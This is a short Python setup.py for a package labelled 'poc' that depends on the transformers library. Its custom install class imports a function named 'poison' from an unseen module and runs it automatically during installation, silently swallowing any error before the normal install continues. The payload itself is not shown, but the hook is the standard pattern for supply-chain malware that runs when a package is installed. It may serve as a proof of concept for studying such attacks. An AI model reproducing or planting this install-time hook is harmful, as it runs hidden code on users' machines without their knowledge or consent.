from setuptools import setup, find_packages
from setuptools.command.install import install

import atexit

class Installer(install):
    def run(self):
        try:
            from divide2_inside_base64_full.poc.main import poison
            poison()
        except Exception as e:
            pass

        install.run(self)


setup(
    name="poc",
    version="0.1",
    packages=find_packages(),
    include_package_data=True,
    install_requires=['transformers'],
    cmdclass={'install': Installer}
)
